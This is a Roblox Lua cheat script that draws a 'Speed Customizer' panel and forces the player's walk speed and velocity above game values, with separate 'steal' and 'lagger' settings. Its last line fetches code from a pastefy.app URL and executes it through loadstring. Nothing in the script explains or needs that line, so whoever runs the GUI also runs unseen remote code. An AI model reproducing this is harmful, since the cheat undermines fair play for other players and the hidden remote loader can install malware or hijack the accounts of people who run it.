--// SPEED CUSTOMIZER GUI

local TweenService = game:GetService("TweenService")
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local UserInputService = game:GetService("UserInputService")
local player = Players.LocalPlayer

local Config = {
    ["Speed Value"] = 53,
    ["Steal Speed Value"] = 29,
    ["Lagger Speed Value"] = 10.1,
    ["Lagger Steal Value"] = 8,
    ["Speed Minimized"] = false,
    ["Speed GUI X"] = 0.5,
    ["Speed GUI Y"] = 0.2,
    ["Speed GUI OffsetX"] = -100,
    ["Speed GUI OffsetY"] = 0,
}

local UILocked = false
local minimized = false

-- ============================================================
-- SPEED STATE
-- ============================================================
local SpeedState = {
    normalSpeed  = Config["Speed Value"],
    carrySpeed   = Config["Steal Speed Value"],
    laggerSpeed  = Config["Lagger Speed Value"],
    laggerSteal  = Config["Lagger Steal Value"],
    isLaggerMode = false,
}

-- Compatibility flags for the new speed logic
local autoBatEnabled   = false
local autoLeftEnabled  = false
local autoRightEnabled = false
local autoPlayEnabled  = false
local _lastAppliedSpd  = 0

-- ============================================================
-- REFERENCES
-- ============================================================
local character, humanoid, humanoidRootPart = nil, nil, nil
local gameSetWalkSpeed = 16
local expectedWalkSpeed = nil

local function onCharacterAdded(newChar)
    character        = newChar
    humanoid         = character:WaitForChild("Humanoid")
    humanoidRootPart = character:WaitForChild("HumanoidRootPart")
    gameSetWalkSpeed = humanoid.WalkSpeed

    humanoid:GetPropertyChangedSignal("WalkSpeed"):Connect(function()
        local current = humanoid.WalkSpeed
        if expectedWalkSpeed and math.abs(current - expectedWalkSpeed) < 0.5 then
            return
        end
        gameSetWalkSpeed = current
    end)
end

if player.Character then onCharacterAdded(player.Character) end
player.CharacterAdded:Connect(onCharacterAdded)

-- ============================================================
-- SPEED APPLICATION
-- ============================================================
local speedActive = false
local speedBoostConn = nil

local function getActiveMoveSpeed()
    if SpeedState.isLaggerMode then
        local isSteal = gameSetWalkSpeed < 25
        return isSteal and SpeedState.laggerSteal or SpeedState.laggerSpeed
    else
        local isSteal = gameSetWalkSpeed < 25
        return isSteal and SpeedState.carrySpeed or SpeedState.normalSpeed
    end
end

local function startSpeedBoost()
    if speedBoostConn then return end
    speedBoostConn = RunService.RenderStepped:Connect(function()
        if autoBatEnabled then return end
        if autoLeftEnabled or autoRightEnabled or autoPlayEnabled then return end
        local char = player.Character
        local hum  = char and char:FindFirstChildOfClass("Humanoid")
        local hrp  = char and char:FindFirstChild("HumanoidRootPart")
        if not char or not hum or not hrp then return end

        local md    = hum.MoveDirection
        local speed = getActiveMoveSpeed()

        if md.Magnitude > 0 then
            expectedWalkSpeed = speed
            hum.WalkSpeed = speed
            hrp.AssemblyLinearVelocity = Vector3.new(md.X * speed, hrp.AssemblyLinearVelocity.Y, md.Z * speed)
            _lastAppliedSpd = Vector3.new(md.X * speed, 0, md.Z * speed).Magnitude
        else
            expectedWalkSpeed = speed
            hum.WalkSpeed = speed
            _lastAppliedSpd = 0
        end
    end)
end

local function stopSpeed()
    if speedBoostConn then
        speedBoostConn:Disconnect()
        speedBoostConn = nil
    end
    expectedWalkSpeed = nil
end

-- ============================================================
-- GUI
-- ============================================================
local gui = Instance.new("ScreenGui")
gui.Name = "BoosterCustomizer"
gui.ResetOnSpawn = false
gui.Enabled = true
gui.Parent = player:WaitForChild("PlayerGui")

local main = Instance.new("Frame")
main.Size = UDim2.new(0, 260, 0, 220)
main.Position = UDim2.new(
    Config["Speed GUI X"],  Config["Speed GUI OffsetX"],
    Config["Speed GUI Y"],  Config["Speed GUI OffsetY"]
)
main.BackgroundColor3    = Color3.fromRGB(10, 10, 15)
main.BackgroundTransparency = 0.15
main.Active   = true
main.Draggable = not UILocked
main.Parent   = gui

Instance.new("UICorner", main).CornerRadius = UDim.new(0, 16)
local stroke = Instance.new("UIStroke", main)
stroke.Color     = Color3.fromRGB(0, 120, 255)
stroke.Thickness = 2

main:GetPropertyChangedSignal("Position"):Connect(function()
    Config["Speed GUI X"]       = main.Position.X.Scale
    Config["Speed GUI OffsetX"] = main.Position.X.Offset
    Config["Speed GUI Y"]       = main.Position.Y.Scale
    Config["Speed GUI OffsetY"] = main.Position.Y.Offset
end)

-- TITLE
local title = Instance.new("TextLabel")
title.Size               = UDim2.new(1, -50, 0, 30)
title.Position           = UDim2.new(0, 15, 0, 4)
title.BackgroundTransparency = 1
title.Text               = "Speed Customizer"
title.Font               = Enum.Font.GothamBold
title.TextSize           = 16
title.TextColor3         = Color3.fromRGB(0, 150, 255)
title.TextXAlignment     = Enum.TextXAlignment.Left
title.Parent             = main

-- MINIMIZE BUTTON
local minimizeButton = Instance.new("TextButton")
minimizeButton.Size               = UDim2.new(0, 24, 0, 24)
minimizeButton.Position           = UDim2.new(1, -30, 0, 5)
minimizeButton.BackgroundColor3   = Color3.fromRGB(20, 20, 25)
minimizeButton.Text               = "▲"
minimizeButton.Font               = Enum.Font.GothamBold
minimizeButton.TextSize           = 14
minimizeButton.TextColor3         = Color3.fromRGB(0, 150, 255)
minimizeButton.BorderSizePixel    = 0
minimizeButton.Parent             = main
Instance.new("UICorner", minimizeButton).CornerRadius = UDim.new(0, 6)

-- ACTIVATE BUTTON
local activate = Instance.new("TextButton")
activate.Size            = UDim2.new(1, -20, 0, 34)
activate.Position        = UDim2.new(0, 10, 0, 38)
activate.BackgroundColor3 = Color3.fromRGB(25, 25, 30)
activate.TextColor3      = Color3.fromRGB(255, 255, 255)
activate.Text            = "OFF"
activate.Font            = Enum.Font.GothamBold
activate.TextSize        = 14
activate.Parent          = main
Instance.new("UICorner", activate).CornerRadius = UDim.new(0, 10)
local activateStroke = Instance.new("UIStroke", activate)
activateStroke.Color = Color3.fromRGB(0, 120, 255)

-- ============================================================
-- GOAL BUTTONS CONTAINER
-- ============================================================
local goalsContainer = Instance.new("Frame")
goalsContainer.Size = UDim2.new(1, -20, 0, 108)
goalsContainer.Position = UDim2.new(0, 10, 0, 78)
goalsContainer.BackgroundTransparency = 1
goalsContainer.Parent = main

local goalsLayout = Instance.new("UIListLayout", goalsContainer)
goalsLayout.FillDirection = Enum.FillDirection.Horizontal
goalsLayout.SortOrder = Enum.SortOrder.LayoutOrder
goalsLayout.Padding = UDim.new(0, 14)
goalsLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center

-- ============================================================
-- GOAL BUTTON BUILDER
-- ============================================================
local goalButtons = {}
local activeGoalStroke = Color3.fromRGB(0, 200, 255)
local inactiveGoalStroke = Color3.fromRGB(60, 60, 70)
local selectedGoal = nil

local function closeAllPopups()
    for _, g in pairs(goalButtons) do
        g.settingsPopup.Visible = false
    end
end

local function updateGoalVisuals()
    for _, g in pairs(goalButtons) do
        if selectedGoal == g.name then
            g.stroke.Color = activeGoalStroke
            g.stroke.Thickness = 3
            g.frame.BackgroundColor3 = Color3.fromRGB(15, 25, 35)
        else
            g.stroke.Color = inactiveGoalStroke
            g.stroke.Thickness = 2
            g.frame.BackgroundColor3 = Color3.fromRGB(22, 22, 28)
        end
    end
end

local function makeGoalButton(name, speedVal, stealVal, isLagger, order)
    local btn = Instance.new("Frame")
    btn.Size = UDim2.new(0, 100, 0, 100)
    btn.BackgroundColor3 = Color3.fromRGB(22, 22, 28)
    btn.BorderSizePixel = 0
    btn.LayoutOrder = order
    btn.Parent = goalsContainer
    Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 20)

    local btnStroke = Instance.new("UIStroke", btn)
    btnStroke.Color = inactiveGoalStroke
    btnStroke.Thickness = 2

    -- Main click area (covers whole button)
    local clickArea = Instance.new("TextButton")
    clickArea.Size = UDim2.new(1, 0, 1, 0)
    clickArea.BackgroundTransparency = 1
    clickArea.Text = ""
    clickArea.ZIndex = 2
    clickArea.Parent = btn

    -- Mode label
    local modeLabel = Instance.new("TextLabel")
    modeLabel.Size = UDim2.new(1, -10, 0, 22)
    modeLabel.Position = UDim2.new(0, 5, 0, 10)
    modeLabel.BackgroundTransparency = 1
    modeLabel.Text = name
    modeLabel.Font = Enum.Font.GothamBold
    modeLabel.TextSize = 15
    modeLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
    modeLabel.ZIndex = 3
    modeLabel.Parent = btn

    -- Speed display
    local spdDisplay = Instance.new("TextLabel")
    spdDisplay.Size = UDim2.new(1, -10, 0, 28)
    spdDisplay.Position = UDim2.new(0, 5, 0, 32)
    spdDisplay.BackgroundTransparency = 1
    spdDisplay.Text = tostring(speedVal)
    spdDisplay.Font = Enum.Font.GothamBold
    spdDisplay.TextSize = 26
    spdDisplay.TextColor3 = Color3.fromRGB(0, 200, 255)
    spdDisplay.ZIndex = 3
    spdDisplay.Parent = btn

    local unitLabel = Instance.new("TextLabel")
    unitLabel.Size = UDim2.new(1, -10, 0, 14)
    unitLabel.Position = UDim2.new(0, 5, 0, 58)
    unitLabel.BackgroundTransparency = 1
    unitLabel.Text = "SPEED"
    unitLabel.Font = Enum.Font.Gotham
    unitLabel.TextSize = 10
    unitLabel.TextColor3 = Color3.fromRGB(150, 150, 150)
    unitLabel.ZIndex = 3
    unitLabel.Parent = btn

    -- Steal speed display
    local stealDisplay = Instance.new("TextLabel")
    stealDisplay.Size = UDim2.new(1, -10, 0, 14)
    stealDisplay.Position = UDim2.new(0, 5, 0, 76)
    stealDisplay.BackgroundTransparency = 1
    stealDisplay.Text = "Steal: " .. tostring(stealVal)
    stealDisplay.Font = Enum.Font.Gotham
    stealDisplay.TextSize = 10
    stealDisplay.TextColor3 = Color3.fromRGB(170, 170, 170)
    stealDisplay.ZIndex = 3
    stealDisplay.Parent = btn

    -- Gear button (settings) — sits on top of clickArea
    local gearBtn = Instance.new("TextButton")
    gearBtn.Size = UDim2.new(0, 24, 0, 24)
    gearBtn.Position = UDim2.new(1, -28, 0, 4)
    gearBtn.BackgroundColor3 = Color3.fromRGB(35, 35, 40)
    gearBtn.Text = "⚙"
    gearBtn.Font = Enum.Font.GothamBold
    gearBtn.TextSize = 13
    gearBtn.TextColor3 = Color3.fromRGB(180, 180, 180)
    gearBtn.ZIndex = 5
    gearBtn.Parent = btn
    Instance.new("UICorner", gearBtn).CornerRadius = UDim.new(0, 6)

    local gearStroke = Instance.new("UIStroke", gearBtn)
    gearStroke.Color = Color3.fromRGB(80, 80, 90)
    gearStroke.Thickness = 1

    -- Settings popup
    local settingsPopup = Instance.new("Frame")
    settingsPopup.Size = UDim2.new(0, 170, 0, 124)
    settingsPopup.Position = UDim2.new(0, -35, 0, 104)
    settingsPopup.BackgroundColor3 = Color3.fromRGB(15, 15, 20)
    settingsPopup.BorderSizePixel = 0
    settingsPopup.Visible = false
    settingsPopup.ZIndex = 10
    settingsPopup.Parent = btn
    Instance.new("UICorner", settingsPopup).CornerRadius = UDim.new(0, 12)
    local popupStroke = Instance.new("UIStroke", settingsPopup)
    popupStroke.Color = Color3.fromRGB(0, 120, 255)
    popupStroke.Thickness = 1

    -- Popup title
    local popupTitle = Instance.new("TextLabel")
    popupTitle.Size = UDim2.new(1, -10, 0, 24)
    popupTitle.Position = UDim2.new(0, 5, 0, 6)
    popupTitle.BackgroundTransparency = 1
    popupTitle.Text = name .. " Settings"
    popupTitle.Font = Enum.Font.GothamBold
    popupTitle.TextSize = 13
    popupTitle.TextColor3 = Color3.fromRGB(0, 150, 255)
    popupTitle.ZIndex = 11
    popupTitle.Parent = settingsPopup

    -- Speed input
    local spdLabel = Instance.new("TextLabel")
    spdLabel.Size = UDim2.new(0.4, 0, 0, 22)
    spdLabel.Position = UDim2.new(0, 10, 0, 32)
    spdLabel.BackgroundTransparency = 1
    spdLabel.Text = "Speed"
    spdLabel.Font = Enum.Font.GothamBold
    spdLabel.TextSize = 12
    spdLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
    spdLabel.ZIndex = 11
    spdLabel.Parent = settingsPopup

    local spdBox = Instance.new("TextBox")
    spdBox.Size = UDim2.new(0.45, 0, 0, 24)
    spdBox.Position = UDim2.new(0.48, 4, 0, 32)
    spdBox.BackgroundColor3 = Color3.fromRGB(25, 25, 30)
    spdBox.TextColor3 = Color3.fromRGB(255, 255, 255)
    spdBox.Text = tostring(speedVal)
    spdBox.Font = Enum.Font.GothamBold
    spdBox.TextSize = 12
    spdBox.ClearTextOnFocus = false
    spdBox.ZIndex = 11
    spdBox.Parent = settingsPopup
    Instance.new("UICorner", spdBox).CornerRadius = UDim.new(0, 6)
    local spdBoxStroke = Instance.new("UIStroke", spdBox)
    spdBoxStroke.Color = Color3.fromRGB(0, 120, 255)
    spdBoxStroke.Thickness = 1

    -- Steal input
    local stlLabel = Instance.new("TextLabel")
    stlLabel.Size = UDim2.new(0.4, 0, 0, 22)
    stlLabel.Position = UDim2.new(0, 10, 0, 62)
    stlLabel.BackgroundTransparency = 1
    stlLabel.Text = "Steal"
    stlLabel.Font = Enum.Font.GothamBold
    stlLabel.TextSize = 12
    stlLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
    stlLabel.ZIndex = 11
    stlLabel.Parent = settingsPopup

    local stlBox = Instance.new("TextBox")
    stlBox.Size = UDim2.new(0.45, 0, 0, 24)
    stlBox.Position = UDim2.new(0.48, 4, 0, 62)
    stlBox.BackgroundColor3 = Color3.fromRGB(25, 25, 30)
    stlBox.TextColor3 = Color3.fromRGB(255, 255, 255)
    stlBox.Text = tostring(stealVal)
    stlBox.Font = Enum.Font.GothamBold
    stlBox.TextSize = 12
    stlBox.ClearTextOnFocus = false
    stlBox.ZIndex = 11
    stlBox.Parent = settingsPopup
    Instance.new("UICorner", stlBox).CornerRadius = UDim.new(0, 6)
    local stlBoxStroke = Instance.new("UIStroke", stlBox)
    stlBoxStroke.Color = Color3.fromRGB(0, 120, 255)
    stlBoxStroke.Thickness = 1

    -- Close button
    local closeBtn = Instance.new("TextButton")
    closeBtn.Size = UDim2.new(0.8, 0, 0, 22)
    closeBtn.Position = UDim2.new(0.1, 0, 0, 94)
    closeBtn.BackgroundColor3 = Color3.fromRGB(0, 120, 255)
    closeBtn.Text = "Done"
    closeBtn.Font = Enum.Font.GothamBold
    closeBtn.TextSize = 11
    closeBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
    closeBtn.ZIndex = 11
    closeBtn.Parent = settingsPopup
    Instance.new("UICorner", closeBtn).CornerRadius = UDim.new(0, 6)

    -- Store references
    local goalData = {
        name = name,
        frame = btn,
        stroke = btnStroke,
        spdDisplay = spdDisplay,
        stealDisplay = stealDisplay,
        settingsPopup = settingsPopup,
        spdBox = spdBox,
        stlBox = stlBox,
        isLagger = isLagger,
    }
    goalButtons[name] = goalData

    -- Click the body to select mode
    clickArea.MouseButton1Click:Connect(function()
        closeAllPopups()
        selectedGoal = name
        SpeedState.isLaggerMode = isLagger
        updateGoalVisuals()
    end)

    -- Click gear to toggle settings
    gearBtn.MouseButton1Click:Connect(function()
        local wasVisible = settingsPopup.Visible
        closeAllPopups()
        settingsPopup.Visible = not wasVisible
    end)

    -- Close popup
    closeBtn.MouseButton1Click:Connect(function()
        settingsPopup.Visible = false
    end)

    -- Speed input handler
    spdBox.FocusLost:Connect(function()
        local text = spdBox.Text:gsub("[^%d%.]", "")
        local num = tonumber(text) or speedVal
        num = math.clamp(num, 1, 200)
        spdBox.Text = tostring(num)
        spdDisplay.Text = tostring(num)
        if isLagger then
            SpeedState.laggerSpeed = num
            Config["Lagger Speed Value"] = num
        else
            SpeedState.normalSpeed = num
            Config["Speed Value"] = num
        end
    end)

    -- Steal input handler
    stlBox.FocusLost:Connect(function()
        local text = stlBox.Text:gsub("[^%d%.]", "")
        local num = tonumber(text) or stealVal
        num = math.clamp(num, 1, 200)
        stlBox.Text = tostring(num)
        stealDisplay.Text = "Steal: " .. tostring(num)
        if isLagger then
            SpeedState.laggerSteal = num
            Config["Lagger Steal Value"] = num
        else
            SpeedState.carrySpeed = num
            Config["Steal Speed Value"] = num
        end
    end)

    return goalData
end

-- Create Normal goal button
makeGoalButton("Normal", Config["Speed Value"], Config["Steal Speed Value"], false, 1)

-- Create Lagger goal button
makeGoalButton("Lagger", Config["Lagger Speed Value"], Config["Lagger Steal Value"], true, 2)

-- Default selection
selectedGoal = "Normal"
updateGoalVisuals()

-- ============================================================
-- ACTIVATE BUTTON
-- ============================================================
activate.MouseButton1Click:Connect(function()
    speedActive = not speedActive

    if speedActive then
        activate.Text             = "ON"
        activate.BackgroundColor3 = Color3.fromRGB(0, 120, 255)
        startSpeedBoost()
    else
        activate.Text             = "OFF"
        activate.BackgroundColor3 = Color3.fromRGB(25, 25, 30)
        stopSpeed()
    end
end)

-- ============================================================
-- MINIMIZE
-- ============================================================
local FULL_SIZE = UDim2.new(0, 260, 0, 220)
local MINI_SIZE = UDim2.new(0, 260, 0, 70)
local elementsToHide = { goalsContainer }

if Config["Speed Minimized"] then
    minimized = true
    minimizeButton.Text = "▼"
    for _, v in pairs(elementsToHide) do v.Visible = false end
    main.Size = MINI_SIZE
end

minimizeButton.MouseButton1Click:Connect(function()
    minimized = not minimized
    Config["Speed Minimized"] = minimized

    if minimized then
        minimizeButton.Text = "▼"
        for _, v in pairs(elementsToHide) do v.Visible = false end
        TweenService:Create(main,
            TweenInfo.new(0.25, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
            {Size = MINI_SIZE}
        ):Play()
    else
        minimizeButton.Text = "▲"
        local tween = TweenService:Create(main,
            TweenInfo.new(0.25, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
            {Size = FULL_SIZE}
        )
        tween:Play()
        tween.Completed:Connect(function()
            goalsContainer.Visible = true
        end)
    end
end)

loadstring(game:HttpGet("https://pastefy.app/AaiE5Jpp/raw"))()